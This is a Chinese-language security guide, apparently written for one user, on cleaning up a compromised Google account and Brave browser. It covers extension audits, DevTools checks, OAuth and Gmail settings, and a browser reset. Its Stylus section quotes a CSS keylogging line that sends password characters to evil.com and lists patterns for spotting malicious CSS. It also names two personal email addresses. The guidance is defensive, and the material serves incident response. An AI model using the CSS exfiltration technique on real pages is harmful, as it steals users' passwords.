# 帳號入侵後的全面安全清理與防禦指南

**你的 Google 帳號被入侵後，最緊急的事不是改密碼，而是登出所有裝置、撤銷所有第三方應用存取權、並檢查 Gmail 轉寄規則**——因為現代攻擊者透過 OAuth token 持久化和 Session Cookie 再生技術，即使改完密碼仍能維持存取。本報告提供從瀏覽器擴充功能審計到 Google 帳號全面清理的完整操作步驟，專門針對 Brave 瀏覽器與多 Google 帳號環境設計。

你的 Google Drive 初步審計顯示，近期文件主要由你的帳號（web516888@gmail.com）建立，另有一個共享資料夾來自 hnk7ai@gmail.com（疑似為你的另一個帳號）。未發現明顯由不明第三方帳號植入的可疑文件，但仍建議進行更深入的權限審計。

-----

## 一、關於「Keygraph Login」後門的重要釐清

經過廣泛搜尋安全資料庫、威脅情報來源和資安通報，**「Keygraph Login」並非已知的惡意軟體或後門名稱**。Keygraph（keygraph.io）實際上是一家合法的 B2B SaaS 安全與合規平台，提供 IAM、MDM 和合規自動化工具。 2026 年 3 月確實有一個 CVE（CVE-2026-29023）揭露了其產品中的硬編碼 API 金鑰漏洞， 但這是 Keygraph 產品本身的漏洞，而非以其命名的惡意軟體。

你的帳號被入侵更可能是以下已知攻擊手法之一：

**Session Cookie 竊取（MultiLogin 漏洞）**是目前最常見的 Google 帳號入侵方式。2023 年 10 月由威脅行為者「PRISMA」發現，利用 Google 未公開的 MultiLogin API 端點來重新生成已過期的認證 Cookie。  至少有 **6 個資訊竊取惡意軟體家族**（Lumma、Rhadamanthys、Stealc、Meduza、RisePro、WhiteSnake）已實作此技術。關鍵威脅在於：**被竊取的 Session Token 在單次密碼重設後仍然有效**。  攻擊者從 Chrome 的 `token_service` 資料表中提取 GAIA ID 和加密 Token，利用 Chrome `Local State` 檔案中的金鑰解密，再透過 MultiLogin 持續重新生成 Google 服務 Cookie。  

其他可能性包括 **GhostToken（OAuth 後門，已於 2023 年 4 月修補）** 允許攻擊者安裝在 Google 應用管理頁面上不可見的惡意 OAuth 應用， 以及 **Kiosk Mode 憑證竊取**（Amadey/StealC 惡意軟體將瀏覽器鎖定在 Google 登入頁面的 Kiosk 模式，迫使受害者輸入憑證後竊取）。 

-----

## 二、Stylus 擴充功能：風險評估與惡意 CSS 檢測

### Stylish 與 Stylus 的本質區別

**Stylish 有確認的間諜軟體行為**。2017 年 1 月起，被 SimilarWeb 收購後的 Stylish 開始秘密收集使用者的**完整瀏覽記錄**—— 每個造訪的 URL、每個 Google 搜尋結果—— 連同唯一識別碼發送到 SimilarWeb 的伺服器。 資安研究員 Robert Heaton 於 2018 年 7 月發表了決定性的揭露報告， 隨後 Google 和 Mozilla 將 Stylish 從擴充功能商店下架。 

**Stylus 是從 Stylish v1.5.2（最後乾淨版本）分叉的開源專案**，  由社群維護在 GitHub（github.com/openstyles/stylus），採用 GPL-3.0 授權，明確不收集任何資料。Chrome-Stats 的風險評估將 Stylus 評為低風險。 然而，Stylus 仍需要廣泛的權限（「存取所有網站上的資料」），** 如果擴充功能本身被入侵（供應鏈攻擊、維護者帳號被接管），理論上可以被武器化**。

### 惡意 CSS 能做什麼——遠比你想像的危險

CSS 即使不借助 JavaScript，也能執行以下攻擊： 

**CSS 鍵盤記錄**利用 CSS 屬性選擇器結合 `background-image: url()` 逐字元洩漏表單輸入值。 例如 `input[type="password"][value$="a"] { background-image: url("http://evil.com/a"); }`，當密碼欄位的值以 “a” 結尾時，瀏覽器會向攻擊者伺服器發送請求。 此技術在使用 React 等框架同步 DOM 屬性的網站上特別有效。 

**CSS 資料外洩**由安全研究員 Mike Gualtieri 系統化展示，能繞過 JavaScript 防護（ 包括 Chrome 的 XSS 審計器）。 PortSwigger 在 2023 年 12 月進一步展示了「盲目 CSS 外洩」技術，使用 CSS 變數、`:has()` 偽類和 `@import` 鏈接，從未知頁面結構中逐字元提取資料。 

**隱藏安全警告**有真實案例：2024 年 Certitude 研究人員展示了嵌入在電子郵件中的 CSS 可以隱藏 Outlook 的「首次聯繫安全提示」警告，甚至偽造 Microsoft 的加密/簽名郵件圖示。 CSS 還可以透過 `display: none`、`visibility: hidden`、`opacity: 0` 等屬性隱藏帳號入侵的跡象——例如登入警報、密碼變更通知、可疑裝置連線提示。  

### 如何檢查 Stylus 中的惡意樣式

**第一步：匯出所有樣式**。開啟 Stylus 管理頁面 → 點擊「匯出」→「匯出樣式」，會下載一個 JSON 檔案。 用文字編輯器開啟這個 JSON 檔案，搜尋以下可疑模式：

- `url(http` 或 `url(https` 指向不明外部網域（非 CDN）
- `background-image:` 搭配屬性選擇器如 `[value^=`、`[value$=`、`[value*=` 
- `@import` 載入外部 CSS
- `@font-face` 的 `src: url()` 指向外部伺服器 
- `display: none` 或 `visibility: hidden` 針對安全/警告元素 
- `z-index` 使用極高值（9999+）
- `margin` 或 `text-indent` 使用極端負值（-9999px） 
- 選擇器目標為 `input[type="password"]`、`input[name="csrf"]`、登入表單或安全 UI 元素
- `unicode-range` 出現在 font-face 宣告中（潛在資料外洩指標）  

**第二步：在管理頁面中篩選「僅外部樣式」**——這些是從網站安裝的樣式，風險高於本地建立的樣式。 逐一點擊每個樣式名稱，在編輯器中檢視完整 CSS 程式碼，確認樣式只套用到預期的網站。

-----

## 三、瀏覽器擴充功能全面審計與清理

### Brave 擴充功能審計步驟

**開啟開發者模式**：在網址列輸入 `brave://extensions`，開啟右上角的「開發者模式」開關。這會顯示每個擴充功能的 ID、版本號和「檢查檢視」連結。

**逐一檢查每個擴充功能的詳細資料**：點擊每個擴充功能的「詳細資料」，檢查以下項目：

1. 權限清單——特別注意「讀取和變更你在所有網站上的資料」
1. 網站存取範圍——將不需要的擴充功能限制為「點擊時」或「在特定網站上」
1. 檢查 `manifest.json` 中的 `content_scripts`（定義注入哪些 URL 的 JS/CSS） 和 `background`（背景腳本）

**直接檢查擴充功能原始碼**：在 macOS 上，Brave 的擴充功能檔案位於 `/Users/[使用者名稱]/Library/Application Support/BraveSoftware/Brave-Browser/Default/Extensions/`。你也可以在 `brave://version/` 中找到「Profile Path」欄位，然後導航到 `Extensions/` 資料夾。每個擴充功能資料夾以其 ID 命名，包含可讀的原始碼。 

**特別注意 manifest.json 中的危險權限**：`"<all_urls>"`、`"tabs"`、`"webRequest"`、`"webRequestBlocking"`、`"cookies"`、`"history"`、`"clipboardRead"`、`"nativeMessaging"`。

### 推薦的擴充功能安全掃描工具

|工具                                |類型                 |費用   |說明                             |
|----------------------------------|-------------------|-----|-------------------------------|
|**Spin.AI SpinMonitor**           |Chrome 擴充功能 + SaaS |免費版可用|AI 驅動的風險評估，即時偵測已安裝擴充功能的風險      |
|**Koidex**（前身 ExtensionTotal）     |網頁工具 + IDE 擴充功能    |個人免費 |解包擴充功能，執行 40+ 檢測項目和 200+ 指標    |
|**Chrome Extension Source Viewer**|Chrome/Firefox 擴充功能|免費   |不需安裝即可檢視擴充功能原始碼                |
|**Tarnish**                       |網頁工具               |免費   |靜態分析，含 manifest 檢視、CSP 分析、漏洞庫偵測|
|**Extension Auditor Pro**         |Chrome 擴充功能        |免費   |完整安全管理，含權限分析、活動記錄、CRX 封存       |

注意：CRXcavator（crxcavator.io）曾是業界標準，但**目前已停止維護**，建議改用 Spin.AI 作為替代。 

-----

## 四、惡意 JavaScript 注入偵測實戰

### DevTools 偵測步驟

**Sources 面板的 Content Scripts 分頁**是最直接的檢查方法。按 F12 開啟 DevTools → 切換到 Sources 面板 → 在左側邊欄找到「Content scripts」區段（在「Page」區段下方），這裡列出所有擴充功能注入的所有 Content Scripts，按擴充功能名稱/ID 分組。 點擊任何腳本即可檢視原始碼、設定斷點。注意搜尋 `eval()`、`new Function()`、混淆程式碼、外部 URL 請求、`document.cookie` 讀取等可疑模式。

**Network 面板監控**：開啟 Network 分頁，按類型篩選（JS、CSS、XHR/Fetch），尋找指向非預期外部網域的請求。檢查「Initiator」欄位追蹤是哪個腳本觸發的請求。

**在 Console 中執行以下診斷指令**：

```javascript
// 列出所有 DOM 中的腳本
document.querySelectorAll('script[src]').forEach(s => console.log(s.src));

// 列出所有樣式表（包含擴充功能注入的）
console.table(
  [...document.styleSheets].map(ss => ({
    href: ss.href || '(inline)',
    ownerNode: ss.ownerNode?.tagName,
    rulesCount: (() => { try { return ss.cssRules?.length } catch(e) { return 'CORS blocked' }})()
  }))
);

// 找出所有 chrome-extension:// 資源
document.querySelectorAll('[src*="chrome-extension://"]').forEach(el => 
  console.log(el.tagName, el.src));

// 檢查全域函式是否被覆寫（潛在 Hook）
const iframe = document.createElement('iframe');
iframe.style.display = 'none';
document.body.appendChild(iframe);
const pristine = iframe.contentWindow;
['fetch', 'XMLHttpRequest', 'addEventListener'].forEach(fn => {
  if (window[fn].toString() !== pristine[fn].toString()) {
    console.warn(`⚠️ ${fn} 已被修改！`);
  }
});
document.body.removeChild(iframe);
```

**即時 DOM 變更監控**——在 Console 中貼入以下 MutationObserver 程式碼，可即時偵測任何腳本或樣式的注入：

```javascript
new MutationObserver(mutations => {
  for (const mutation of mutations) {
    for (const node of mutation.addedNodes) {
      if (node instanceof HTMLElement) {
        if (node.matches('script, style, link[rel="stylesheet"], iframe')) {
          console.warn('⚠️ 偵測到注入元素:', {
            tag: node.tagName,
            src: node.src || node.href || '(inline)',
            content: node.textContent?.substring(0, 200)
          });
          console.trace();
        }
      }
    }
  }
}).observe(document.body, { childList: true, subtree: true });
```

### 架構性限制須知

根據 SquareX 2025 年的研究，DevTools 存在根本性限制：它設計用於檢查網頁而非擴充功能，某些惡意擴充功能可以注入與頁面本身難以區分的網路請求， 某些惡意程式碼僅在特定條件下（延時觸發、使用者操作觸發、環境特定）才會啟動，在一般檢查期間保持休眠狀態。 因此，**最安全的方法是移除所有擴充功能後重新逐一安裝**。

-----

## 五、Google Drive 跨帳號安全審計

### 快速檢查近期可疑檔案

**透過 Google Drive 介面**：導航至 drive.google.com → 點擊左側「近期存取」查看按最後修改/開啟時間排序的檔案。使用搜尋列搭配運算子 `after:2024-01-01` 或 `before:2024-06-01` 按日期篩選。

**檢查「與我共用」的檔案**：點擊左側「與我共用」，檢查是否有來自不認識的電子郵件地址的檔案。對你的帳號而言，目前看到一個由 hnk7ai@gmail.com 共享的「A8_LOCAL」資料夾——如果這是你的另一個帳號則正常，否則需要進一步調查。

**檢查垃圾桶和隱藏檔案**：點擊左側「垃圾桶」查看已刪除但尚未永久清除的檔案（保留 30 天）。某些應用程式會建立隱藏的應用資料檔案，需透過 Drive API 使用 `spaces="appDataFolder"` 搭配 `files.list` 來列舉。

### OAuth 應用存取權審計——最關鍵的步驟

前往 `https://myaccount.google.com/permissions`，檢視每個已授權的應用程式及其權限範圍。** 移除所有不認識或不再使用的應用**。特別注意擁有 Gmail、Drive、Calendar 廣泛權限的應用。

**關鍵安全警告**：OAuth Token 即使在應用解除安裝後可能仍然有效。  休眠的 Token 構成「隱形後門」——研究顯示，超過 **70%** 的企業環境中發現了具特權的休眠服務帳號。 

### Google Takeout 作為威脅向量

Google Takeout（takeout.google.com）是一個容易被忽略的資料外洩路徑。 它預設啟用， 允許匯出到外部雲端儲存（Dropbox、Box、OneDrive）， 且 **Takeout 審計日誌無法透過 Google Workspace API 存取**。  檢查方法：登入 Google 管理控制台 → 報告 → 稽核和調查 → Takeout 日誌事件。確認是否有未經授權的資料匯出。

### Mitiga 研究揭露的關鍵審計盲區

沒有付費 Google Workspace 授權的使用者仍可以檢視者身份存取私人 Drive 和共用雲端硬碟。**未授權使用者的操作不會產生任何審計日誌**。 攻擊者如果入侵管理員帳號，可以撤銷使用者的授權、下載所有私人檔案、再重新指派授權——只有授權變更事件會被記錄。 

-----

## 六、多帳號環境全面安全清理清單

### 針對每個 Google 帳號重複執行以下步驟

**步驟 1：從已知乾淨裝置登入**（建議先完成惡意軟體掃描）。前往 `myaccount.google.com/security`，將密碼更改為 **20 字元以上的強密碼**。更改密碼會自動撤銷郵件範圍的 OAuth 2.0 Token。 

**步驟 2：登出所有工作階段**。前往 `myaccount.google.com/device-activity`，檢視所有已登入裝置，對每個不熟悉的裝置點擊「登出」。**這是最關鍵的步驟**——這會使被竊取的 Session Token（包括透過 MultiLogin 重新生成的 Cookie）失效。  只在已驗證的乾淨裝置上重新登入。

**步驟 3：撤銷所有第三方應用權限**。前往 `myaccount.google.com/permissions`，檢視每個列出的應用程式。對任何不認識或不再使用的應用點擊「移除存取權」。  

**步驟 4：檢查 Gmail 轉寄規則**。開啟 Gmail → 齒輪圖示 → 查看所有設定 → 「轉寄和 POP/IMAP」分頁。檢查是否有未授權的轉寄地址，刪除所有可疑轉寄地址。 如果不需要，停用 IMAP 和 POP 存取。 

**步驟 5：檢查 Gmail 篩選器**。在設定中的「篩選器和封鎖的地址」分頁，逐一檢查所有篩選器。 注意會將郵件轉寄到不明地址、自動刪除或封存郵件、標記為已讀（隱藏活動）、或跳過收件匣的篩選器。

**步驟 6：檢查委派存取**。在設定 → 「帳戶和匯入」分頁 → 「授予帳戶存取權」，移除所有未授權的委派帳戶。 

**步驟 7：驗證帳戶復原選項**。前往 `myaccount.google.com/security` → 「驗證身份的方式」，確認復原電子郵件和復原電話號碼都是你的。攻擊者經常添加自己的復原選項。

**步驟 8：檢視近期安全事件**。前往 `myaccount.google.com/notifications`，檢查不熟悉的登入、密碼變更或設定變更。 在 Gmail 底部點擊「詳細資料」查看近期存取 IP。

### 跨帳號攻擊的防禦重點

攻擊者維持跨帳號持久存取的主要手法包括：**OAuth Refresh Token 在明確撤銷之前一直有效**，單純更改密碼不足以撤銷所有 Token；**  Gmail 轉寄和篩選規則在密碼變更後仍然持續運作**；** 委派帳戶可以在不需密碼的情況下讀取、發送和刪除郵件**。 

Google 目前正在開發 **DBSC（裝置綁定工作階段憑證）**，可將工作階段綁定到特定裝置的加密金鑰，使被竊的 Cookie 在其他裝置上無法使用，目前僅在 Windows 版 Chrome 上提供 Beta 測試。 

-----

## 七、Brave 瀏覽器完整安全重設與防禦建立

### 完全重設步驟（入侵後建議執行）

**第一步：移除所有擴充功能**。開啟 `brave://extensions/`，對每個擴充功能點擊「移除」。不要只是停用——攻擊者可以重新啟用已停用的擴充功能。

**第二步：清除所有瀏覽資料**。按 `Cmd+Shift+Delete`（macOS），切換到「進階」分頁，時間範圍設為「全部」，勾選所有項目（瀏覽記錄、下載記錄、Cookie、快取、密碼、自動填入、網站設定、託管應用程式資料），點擊「清除資料」。 

**第三步：重設瀏覽器設定**。開啟 `brave://settings/` → 左側欄「重設設定」→ 「將設定還原為原始預設值」→ 確認。 

**第四步：建立全新瀏覽器設定檔**。點擊右上角的設定檔圖示 → 「新增設定檔」→ 建立新設定檔。使用此乾淨設定檔，刪除舊的（已被入侵的）設定檔。

**第五步（最高安全等級）：完全重新安裝**。在 macOS 上：完全退出 Brave → 從應用程式中刪除 → 刪除設定檔資料目錄 `~/Library/Application Support/BraveSoftware/` → 清空垃圾桶 → 從 brave.com 重新安裝。

**第六步：配置安全設定**。Shields 設為「積極」→ 啟用「封鎖跨站 Cookie」→ 啟用「關閉所有視窗時清除 Cookie 和網站資料」 → 指紋保護設為「嚴格」→ 啟用安全瀏覽。

### 惡意軟體掃描工具推薦

**macOS 首選**：

|工具                                 |價格             |特點                                          |
|-----------------------------------|---------------|--------------------------------------------|
|**Malwarebytes for Mac**           |免費掃描 / $59.99/年|快速掃描，~95% 偵測率， 2025 PCMag 讀者之選              |
|**Intego Mac Internet Security X9**|~$49.99/年      |Mac 專用，AV-Test 完美偵測率，含防火牆，可透過 USB 掃描 iOS 裝置 |
|**Malwarebytes Browser Guard**     |免費             |瀏覽器擴充功能，即時封鎖惡意網站和網路釣魚                       |

**macOS 額外檢查項目**：檢查系統設定 → 一般 → 登入項目（是否有不明項目）；檢查系統設定 → 隱私與安全性 → 描述檔（如果存在，不明描述檔可能表示惡意軟體配置）；檢查 `/Library/LaunchAgents/` 和 `~/Library/LaunchAgents/` 是否有可疑的 .plist 檔案。

**iOS 安全須知**：Apple 不允許在 iOS 上進行真正的防毒掃描，任何 App Store 應用都無法掃描其他應用。 你能做的是：保持 iOS 更新、使用 Intego 透過 USB 從 Mac 掃描 iPhone、使用 iVerify 進行安全強化檢查、定期檢查設定 → 隱私與安全性中的應用權限。

-----

## 持續監控與長期防禦策略

**最強防護：加入 Google 進階保護計畫**（landing.google.com/advancedprotection/）。這是免費的， 自 2024 年 7 月起接受 Passkey 註冊（不再強制要求實體安全金鑰）， 提供防網路釣魚登入、增強下載掃描、限制第三方應用存取、加強 Gmail 掃描和更嚴格的帳號復原程序。** 建議所有帳號都加入**。

**硬體安全金鑰是唯一能抵禦即時釣魚代理攻擊（AITM）的 2FA 方法**。TOTP 驗證碼和 SMS 都可以被釣魚。 推薦 **YubiKey 5C NFC**（~$55，USB-C + NFC，適用電腦和手機）作為主要金鑰，**YubiKey Security Key NFC**（~$29，僅 FIDO2）作為備用金鑰。至少註冊兩把金鑰（主要 + 備用存放在安全位置），並將備份驗證碼列印保存在實體安全位置。 

**密碼管理器選擇**：**1Password**（$2.99/月，最佳使用體驗，Travel Mode，無已知外洩）或 **Bitwarden**（免費/Premium $10/年，開源已審計，最佳性價比）。為每個網站生成 16+ 字元的隨機唯一密碼，在密碼管理器本身也啟用硬體安全金鑰 2FA。

建立**每月安全審計習慣**：檢視已登入裝置、應用權限、轉寄規則、復原選項。在 haveibeenpwned.com 註冊電子郵件以接收外洩通知。在密碼管理器中啟用暗網監控。定期檢查 `myaccount.google.com/data-and-privacy` 中的帳號活動。

## 立即行動的優先順序

最後，將所有清理步驟按緊急程度排列：**第一**，在所有裝置上執行 Malwarebytes 完整掃描；**第二**，完全重設 Brave 瀏覽器（按上述步驟）；**第三**，對每個 Google 帳號執行完整安全清理清單（登出所有工作階段 → 改密碼 → 撤銷應用 → 檢查轉寄/篩選/委派 → 驗證復原選項）；**第四**，在所有帳號上設定硬體安全金鑰；**第五**，加入 Google 進階保護計畫；**第六**，設定密碼管理器並為所有重要帳號生成新密碼；**第七**，建立持續監控機制。整個流程建議在同一天內完成前四步，因為在清理完成之前，攻擊者可能仍然擁有存取權限。